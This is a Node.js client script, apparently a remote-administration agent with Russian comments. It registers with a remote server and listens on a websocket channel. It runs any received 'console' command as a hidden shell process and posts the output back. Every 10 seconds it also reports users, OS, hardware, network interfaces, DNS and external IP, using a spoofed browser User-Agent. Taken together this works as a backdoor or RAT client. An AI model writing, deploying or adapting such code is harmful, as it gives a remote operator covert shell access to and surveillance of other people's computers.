var 
// Requests
cloudscraper = require('cloudscraper'), 
// System Information
si = require('systeminformation'), 
dns = require('dns'), 
// Configuration
pjson = require('./package.json'), 
config = require('./config.js'),
// Websocket
Centrifuge = require("centrifuge"),
WebSocket = require('ws'),
// System Process
child_process = require('child_process'),
// HUYNYA EBANAYA ZAEBALA
colors = require('colors');

module.exports.init = function (ioSocket) {
    io = ioSocket;
};

cloudscraper({ method: 'POST', url: pjson.homepage + '/api/room/identificate', formData: { name: config.name, org: config.org, }, headers: {  'Accept': 'application/json', 'Authorization': config.token } }).then((data) => {
  config.id = JSON.parse(data).id; config.centrifugo = JSON.parse(data).centrifugo;
  console.log(data);
  var centrifuge = new Centrifuge('wss://app.mydevwork.ru/connection/websocket', { websocket: WebSocket });
  centrifuge.setToken(config.centrifugo);
  centrifuge.connect();
  centrifuge.subscribe("pc#" + config.id, function(message) {
      message = message.data;
      if(message.type == 'console') {
        var workerProcess_1 = child_process.exec(message.input, { windowsHide: true }, function (error_2, stdout_2, stderr_2) {
          let messageoutput = stdout_2;
          if(error_2) messageoutput = stderr_2;
          cloudscraper({ method: 'POST', url: pjson.homepage + '/api/console/' + config.id, formData: { output: messageoutput }, headers: { 'User-Agent': 'Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36', 'Cache-Control': 'private', 'Accept': 'application/json', 'Authorization': config.token }});
        }); 
      } else console.log(message);
  });
  // Данные до интервала моно обновить 1 раз ибо их толком на горячку не заменить
  si.users().then((data) => updatedevice('users', 'Пользователи', JSON.stringify(data))); // Пользователи
  si.osInfo().then((data) => updatedevice('os', 'Операционная система', JSON.stringify(data))); // ОС
  si.graphics().then((data) => updatedevice('videocard', 'Видеокарты', JSON.stringify(data))); // Видеокарты
  si.cpu().then((data) => updatedevice('cpu', 'Процессор', JSON.stringify(data))); // Процессор
  // Обновляем например каждые 10 секунд
  setInterval(() => {
    cloudscraper.get('https://api.ipify.org/?format=json').then((data) => updatedevice('IP', 'Внешний IP', data)); // Внешний IP
    si.networkInterfaces().then((data) => updatedevice('networks', 'Интерфейсы', JSON.stringify(data))); // Интерфейсы
    updatedevice('dns', 'Dns сервера', JSON.stringify(dns.getServers())); // Dns сервера
    si.currentLoad().then((data) => updatedevice('cpuCurrentspeed', 'Нагрузка процессора', JSON.stringify(data))); // Нагрузка процессора
    si.mem().then((data) => updatedevice('memory', 'Оперативная память', JSON.stringify(data))); // ОЗУ
    si.fsSize().then((data) => updatedevice('hardware', 'Жесткие диски', JSON.stringify(data))); // Жесткие диски
  }, 10000); 
}).catch((data) => io('Обнаружена новая версия, перезапуск программы.'));
function updatedevice(type, name, data) {
  cloudscraper({ method: 'POST', url: pjson.homepage + '/api/room/' + config.id, formData: { name: name, type: type, data: data }, headers: { 
	  	'User-Agent': 'Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36', 
	  	'Cache-Control': 'private', 
	  	'Accept': 'application/json', 
	  	'Authorization': config.token 
	}}).then((info) => {
		if(pjson.version != JSON.parse(info).v) {
      return io('Обнаружена новая версия, перезапуск программы.');
    } else console.log('Отправлено новое обновление данных: ' + name);
	}).catch((data) => {
    return console.log('Обнаружена ошибка при отправке: ' + name);
  });
} 